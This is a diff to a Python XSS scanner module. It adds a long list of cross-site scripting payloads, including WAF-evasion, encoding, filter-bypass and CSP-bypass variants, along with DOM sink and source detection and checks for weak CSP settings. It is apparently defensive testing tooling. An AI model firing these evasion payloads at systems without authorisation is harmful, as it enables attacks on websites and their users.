@@ -9,6 +9,10 @@ from .base import BaseScanner
 from ..models.scan import ScanTarget
 from ..models.finding import Finding, FindingSeverity, FindingCategory
 from ..models.scan_mode import ScanMode
+from ..utils.evidence_collector import EvidenceCollector
+
+import logging
+logger = logging.getLogger(__name__)
 
 
 class XSSTester(BaseScanner):
@@ -28,14 +32,14 @@ class XSSTester(BaseScanner):
             enabled=enabled,
             scan_mode=scan_mode
         )
-        self.session = requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
+        # Use OPSEC-enabled session helper
+        from ..utils.scanner_session import create_scanner_session
+        self.session = create_scanner_session()
         
-        # Common XSS payloads (non-destructive, proof-of-concept only)
+        # Comprehensive XSS payloads (non-destructive, proof-of-concept only)
+        # Includes WAF evasion, encoding variations, and context-specific payloads
         self.xss_payloads = [
+            # Basic payloads
             '<script>alert("XSS")</script>',
             '<img src=x onerror=alert("XSS")>',
             '<svg onload=alert("XSS")>',
@@ -51,6 +55,74 @@ class XSSTester(BaseScanner):
             "';alert('XSS');//",
             '<script>alert(document.cookie)</script>',
             '<script>alert(document.domain)</script>',
+            
+            # WAF evasion techniques
+            '<ScRiPt>alert("XSS")</ScRiPt>',
+            '<script>alert(String.fromCharCode(88,83,83))</script>',
+            '<img src=x onerror=alert`XSS`>',
+            '<svg/onload=alert("XSS")>',
+            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
+            '<iframe srcdoc="<script>alert(String.fromCharCode(88,83,83))</script>">',
+            '<details open ontoggle=alert("XSS")>',
+            '<marquee onstart=alert("XSS")>',
+            '<video><source onerror=alert("XSS")>',
+            '<audio src=x onerror=alert("XSS")>',
+            
+            # Encoding variations
+            '%3Cscript%3Ealert("XSS")%3C/script%3E',
+            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
+            '\x3Cscript\x3Ealert("XSS")\x3C/script\x3E',
+            '&#60;script&#62;alert("XSS")&#60;/script&#62;',
+            '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
+            
+            # Event handler variations
+            '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
+            '<img src=x onerror=\'alert("XSS")\'>',
+            '<img src=x OneRrOr=alert("XSS")>',
+            '<div onmouseover=alert("XSS")>test</div>',
+            '<div onclick=alert("XSS")>click</div>',
+            '<form onsubmit=alert("XSS")><input type=submit></form>',
+            
+            # JavaScript protocol
+            'javascript:alert("XSS")',
+            'javascript:alert(String.fromCharCode(88,83,83))',
+            'javascript:alert(document.cookie)',
+            'JaVaScRiPt:alert("XSS")',
+            
+            # DOM XSS payloads
+            '<script>eval(location.hash.slice(1))</script>',
+            '<script>setTimeout("alert(\'XSS\')", 0)</script>',
+            '<script>Function("alert(\'XSS\')")()</script>',
+            
+            # Data URI
+            '<img src="data:text/html,<script>alert(\'XSS\')</script>">',
+            '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
+            
+            # Filter bypass attempts
+            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
+            '<<script>alert("XSS");//<</script>',
+            '<img src="x:g" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
+            
+            # HTML5 vectors
+            '<input autofocus onfocus=alert("XSS")>',
+            '<keygen onfocus=alert("XSS") autofocus>',
+            '<textarea onfocus=alert("XSS") autofocus>',
+            '<select onfocus=alert("XSS") autofocus>',
+            
+            # SVG vectors
+            '<svg><animatetransform onbegin=alert("XSS")>',
+            '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
+            
+            # CSS injection (if context allows)
+            '<style>@import "javascript:alert(\'XSS\')";</style>',
+            '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
+            
+            # Template literal (ES6)
+            '<img src=x onerror=alert`${document.domain}`>',
+            
+            # CSP bypass attempts
+            '<script nonce="test">alert("XSS")</script>',
+            '<base href="javascript://"><script>alert("XSS")</script>',
         ]
     
     def is_available(self) -> bool:
@@ -103,6 +175,14 @@ class XSSTester(BaseScanner):
                     if payload in response.text:
                         # Check if it's executed (look for unescaped script tags)
                         if '<script>' in response.text and payload in response.text:
+                            # Collect evidence
+                            evidence_data = EvidenceCollector.collect_request_response(
+                                response,
+                                request_url=test_url,
+                                request_method="GET"
+                            )
+                            evidence_str = EvidenceCollector.format_evidence_string(evidence_data)
+                            
                             findings.append(Finding(
                                 title=f"Reflected XSS Vulnerability Detected",
                                 description=f"Cross-Site Scripting (XSS) vulnerability found in parameter '{param_name}' at {url}. The payload '{payload[:50]}...' is reflected in the response and may be executed in user browsers.",
@@ -111,6 +191,7 @@ class XSSTester(BaseScanner):
                                 source_scanner="xss_tester",
                                 source_id=f"reflected_xss_{param_name}",
                                 url=test_url,
+                                evidence=evidence_str,
                                 remediation=f"Sanitize and validate all user input, especially parameter '{param_name}'. Use output encoding/escaping (HTML entity encoding, JavaScript encoding). Implement Content Security Policy (CSP) headers. Use a Web Application Firewall (WAF).",
                                 exploited=True,
                                 exploitation_details=f"XSS payload successfully reflected in parameter '{param_name}'. Payload: {payload[:100]}",
@@ -119,6 +200,7 @@ class XSSTester(BaseScanner):
                                     "payload": payload,
                                     "vulnerability_type": "reflected_xss",
                                     "url": test_url,
+                                    "evidence_data": evidence_data,
                                 },
                             ))
                             break  # Found XSS, no need to test more payloads for this parameter
@@ -195,32 +277,125 @@ class XSSTester(BaseScanner):
         """Test for DOM-based XSS vulnerabilities."""
         findings = []
         
-        # Test hash-based XSS (DOM manipulation)
-        for payload in self.xss_payloads[:3]:
-            try:
-                test_url = f"{url}#{payload}"
-                response = self.session.get(test_url, timeout=10)
+        try:
+            response = self.session.get(url, timeout=10)
+            content = response.text
+            
+            # Enhanced DOM XSS detection
+            # Check for dangerous JavaScript sinks
+            dangerous_sinks = [
+                'innerHTML',
+                'outerHTML',
+                'document.write',
+                'document.writeln',
+                'eval(',
+                'Function(',
+                'setTimeout(',
+                'setInterval(',
+                'location.href',
+                'location.replace',
+                'location.assign',
+                'document.location',
+                'window.location',
+            ]
+            
+            # Check for sources (user-controlled data)
+            dangerous_sources = [
+                'location.hash',
+                'location.search',
+                'location.href',
+                'document.URL',
+                'document.documentURI',
+                'document.referrer',
+                'window.name',
+                'document.cookie',
+            ]
+            
+            # Check if page uses dangerous patterns
+            has_sinks = any(sink in content for sink in dangerous_sinks)
+            has_sources = any(source in content for source in dangerous_sources)
+            
+            if has_sinks and has_sources:
+                # Test hash-based XSS (DOM manipulation)
+                for payload in self.xss_payloads[:5]:
+                    try:
+                        test_url = f"{url}#{payload}"
+                        hash_response = self.session.get(test_url, timeout=10)
+                        
+                        # Check if payload appears in JavaScript context
+                        if payload in hash_response.text and ('<script' in hash_response.text or 'eval' in hash_response.text):
+                            findings.append(Finding(
+                                title="DOM-Based XSS Vulnerability Detected",
+                                description=f"DOM-based XSS vulnerability detected. URL fragment (hash) '{payload[:50]}...' is processed by JavaScript without proper sanitization. Dangerous sinks and sources detected in page source.",
+                                severity=FindingSeverity.HIGH,
+                                category=FindingCategory.VULNERABILITY,
+                                source_scanner="xss_tester",
+                                source_id="dom_xss",
+                                url=test_url,
+                                evidence=f"Payload in hash processed by JavaScript. Page contains dangerous sinks: {', '.join([s for s in dangerous_sinks if s in content][:3])}",
+                                exploitation_details=f"DOM XSS confirmed via URL fragment manipulation. Payload executed in JavaScript context.",
+                                remediation="Sanitize all data processed by JavaScript, especially URL fragments (location.hash), document.location, and innerHTML. Use safe DOM manipulation methods (textContent instead of innerHTML). Implement Content Security Policy (CSP) with 'unsafe-inline' restrictions.",
+                                references=["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
+                                metadata={
+                                    "payload": payload[:100],
+                                    "vulnerability_type": "dom_xss",
+                                    "sinks_detected": [s for s in dangerous_sinks if s in content],
+                                    "sources_detected": [s for s in dangerous_sources if s in content],
+                                },
+                            ))
+                            break
+                    except:
+                        continue
+            
+            # Test for CSP bypass techniques
+            csp_bypass_findings = self._test_csp_bypass(url, content)
+            findings.extend(csp_bypass_findings)
+            
+        except Exception as e:
+            logger.debug(f"DOM XSS test error: {e}")
+        
+        return findings
+    
+    def _test_csp_bypass(self, url: str, content: str) -> List[Finding]:
+        """Test for Content Security Policy (CSP) bypasses."""
+        findings = []
+        
+        # Check for CSP header
+        try:
+            response = self.session.get(url, timeout=10)
+            csp_header = response.headers.get('Content-Security-Policy', '')
+            
+            if csp_header:
+                # Check for common CSP bypass patterns
+                bypass_indicators = []
                 
-                # Check if JavaScript processes the hash
-                if 'location.hash' in response.text or 'window.location' in response.text:
-                    # Potential DOM XSS - would need JavaScript execution to confirm
+                # Check for 'unsafe-inline' in script-src (weakens CSP)
+                if 'unsafe-inline' in csp_header and 'script-src' in csp_header:
+                    bypass_indicators.append("'unsafe-inline' in script-src allows inline scripts")
+                
+                # Check for wildcards
+                if 'https://*' in csp_header or 'http://*' in csp_header:
+                    bypass_indicators.append("Wildcard in CSP allows any domain")
+                
+                # Check for missing object-src or default-src issues
+                if 'object-src' not in csp_header.lower() and 'default-src' not in csp_header.lower():
+                    bypass_indicators.append("Missing object-src or default-src may allow object/embed tags")
+                
+                if bypass_indicators:
                     findings.append(Finding(
-                        title="Potential DOM-Based XSS Vulnerability",
-                        description=f"Potential DOM-based XSS vulnerability detected. The application may process URL fragments (hash) in JavaScript, which could lead to XSS if not properly sanitized.",
-                        severity=FindingSeverity.MEDIUM,
-                        category=FindingCategory.VULNERABILITY,
+                        title="Content Security Policy (CSP) Weaknesses",
+                        description=f"CSP header detected but contains weaknesses that may allow XSS bypass: {', '.join(bypass_indicators)}",
+                        severity=FindingSeverity.LOW,
+                        category=FindingCategory.WEAK_SECURITY,
                         source_scanner="xss_tester",
-                        source_id="dom_xss",
-                        url=test_url,
-                        remediation="Sanitize all data processed by JavaScript, especially URL fragments, document.location, and innerHTML. Use safe DOM manipulation methods and Content Security Policy (CSP).",
-                        metadata={
-                            "payload": payload,
-                            "vulnerability_type": "dom_xss",
-                        },
+                        source_id="csp_bypass",
+                        url=url,
+                        evidence=f"CSP header: {csp_header[:200]}",
+                        remediation="Strengthen CSP by removing 'unsafe-inline', using nonces or hashes for inline scripts, avoiding wildcards, and setting appropriate default-src directives.",
+                        metadata={'csp_header': csp_header, 'bypass_indicators': bypass_indicators}
                     ))
-                    break
-            except:
-                continue
+        except:
+            pass
         
         return findings
     
